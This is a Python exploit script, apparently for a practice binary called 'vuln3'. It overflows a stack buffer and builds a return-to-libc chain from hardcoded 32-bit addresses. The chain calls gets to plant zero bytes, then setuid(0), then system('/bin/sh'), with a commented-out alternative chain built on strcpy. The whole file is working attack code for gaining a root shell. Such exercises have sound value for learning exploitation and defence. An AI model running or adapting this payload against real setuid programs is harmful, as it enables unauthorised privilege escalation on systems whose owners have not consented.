#!/usr/bin/env python

import struct
import subprocess
import binascii
eip_addr = hex(0xbfffef10 +0x0000000c)


# Gadets in libc

# 00074440 gets
# 0x00127ce1: pop eax; ret; 

# 0x00127ce1: pop eax; ret;

libc_address = 0xb7c00000 # not necessary anymore

setuid_address = libc_address+0x00118410

gets_address = libc_address+0x00074440

strcpy_address = libc_address+0x0009f280

system_address = 0xb7c4c80b

exit_address = 0xb7c3bc90

bin_sh_address = 0xb7db5faa 

pop_pop_ret_address = 0xb7ca364e# pop edi; pop esi; ret; 

pop_return_address = libc_address + 0x0002352d  #0x00127ce1 
buf = "A" * 264

buf_start_addr = 0xbfffee04
first_null_byte = buf_start_addr + 264 + (4*12) + 8 #stack goes down so buffer +264 As + 4( gets blocks) + 8(seteuid block)

buf += struct.pack("<I",gets_address)
buf += struct.pack("<I",pop_return_address)            #+4
buf +=  struct.pack("<I",first_null_byte)#"DDDD"     #+8
buf += struct.pack("<I",gets_address)                  #+c
buf += struct.pack("<I",pop_return_address)            #
buf += struct.pack("<I",first_null_byte+1)            #"DDDD"
buf += struct.pack("<I",gets_address)
buf += struct.pack("<I",pop_return_address)
buf += struct.pack("<I",first_null_byte+2)      #"DDDD"
buf += struct.pack("<I",gets_address)
buf += struct.pack("<I",pop_return_address)
buf += struct.pack("<I",first_null_byte+3)#"DDDD"


"""
buf_start_addr = 0xbfffedf4

first_null_byte = buf_start_addr + 264 + (4*16) + 8 

zero_address = 0xb7db5fb1 #/bin/sh address last byte :D


buf += struct.pack("<I",strcpy_address)
buf += struct.pack("<I",pop_pop_ret_address)
buf += struct.pack("<I",first_null_byte)   #1st argument = destination
buf += struct.pack("<I",zero_address) #2nd argument = source


buf += struct.pack("<I",strcpy_address)
buf += struct.pack("<I",pop_pop_ret_address)
buf += struct.pack("<I",first_null_byte+1) #1st argument = destination
buf += struct.pack("<I",zero_address) #2nd argument = source


buf += struct.pack("<I",strcpy_address)
buf += struct.pack("<I",pop_pop_ret_address)
buf += struct.pack("<I",first_null_byte+2) #1st argument = destination
buf += struct.pack("<I",zero_address) #2nd argument = source

buf += struct.pack("<I",strcpy_address)
buf += struct.pack("<I",pop_pop_ret_address)
buf += struct.pack("<I",first_null_byte+3) #1st argument = destination
buf += struct.pack("<I",zero_address) #2nd argument = source"""



buf += struct.pack("<I",setuid_address)
buf += struct.pack("<I",pop_return_address)
buf += 'C'*4 #seteuid argument will written by gets here
buf += struct.pack("<I",system_address)
buf += struct.pack("<I",exit_address)
buf += struct.pack("<I",bin_sh_address)
#buf += "DDDD"

print(buf)
#subprocess.call(["./vuln3", buf])


